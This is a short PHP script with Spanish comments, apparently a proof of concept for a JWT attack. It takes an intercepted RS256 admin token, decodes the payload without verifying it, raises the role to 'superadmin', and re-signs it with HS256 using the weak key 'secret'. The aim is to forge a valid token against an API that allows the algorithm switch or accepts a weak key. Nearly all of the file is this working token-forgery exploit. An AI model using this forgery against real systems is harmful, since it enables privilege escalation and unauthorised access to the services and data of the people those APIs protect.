<?php
require 'vendor/autoload.php';
use Firebase\JWT\JWT;

// Pega aquí un JWT válido generado con RS256 (el que interceptaste o generaste)
$original_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDY4MTkxMDYsImV4cCI6MTc0NjgyMjcwNn0.hLbeY2V_7sBAuWkXp6pQjAziGm1NCgu3cO_T_YC6Ovd5o5Lb-gxIyCkeVRk_zc1b4oGMgfHKn9iKvD77MPNpdFu9akg8SL9fvvtVUMCOVZRpxpTC_D_htCYY5mHwK_b6QGMaohm_e8GFwu9ff2s2Crej391TOyBYozy5Jhnu6oUeIcPvwGDiHQhi3-fmwe0Amu9lUZxoxpzOsH1-vL2PlEwpoIkfkaG6wFQRppqDzTQfaDbbCipNX32vRlV2Oies3U6GwPSonnCYn45WY51aA3D3TDVItYHJGu9asGIX6BbCQ__w5mMQKL51lN9-csf4r1uJAmfzjNgIMkj-GoAxuQ";

// Decodificar el token sin verificar la firma (INSEGURO)
$token_parts = explode(".", $original_token);
if (count($token_parts) !== 3) {
    die("Error: Formato de JWT incorrecto.");
}
// Asegurarse de que el payload no sea nulo tras decodificar
$payload_base64 = $token_parts[1];
$payload = json_decode(base64_decode($payload_base64), true);

if (is_null($payload)) {
    die("Error: No se pudo decodificar el payload del JWT.");
}

echo "Payload original:\n";
print_r($payload);

// Modificar el payload para escalar privilegios
$payload['role'] = 'superadmin'; // Intentar cambiar el rol
// Opcional: Actualizar iat y exp si el token original podría estar expirado
// $payload['iat'] = time();
// $payload['exp'] = time() + 3600;


// Volver a firmar el token con una clave débil ('secret') usando HS256
// ESTO ES LO QUE EL ATACANTE INTENTARÍA SI LA API FUERA VULNERABLE
// A UN CAMBIO DE ALGORITMO O ACEPTARA HS256 CON CLAVE DÉBIL
$weak_key = "secret";
$new_token_hs256 = JWT::encode($payload, $weak_key, "HS256");

echo "\nNuevo JWT modificado (firmado con HS256 y clave débil):\n";
echo $new_token_hs256 . "\n";
?>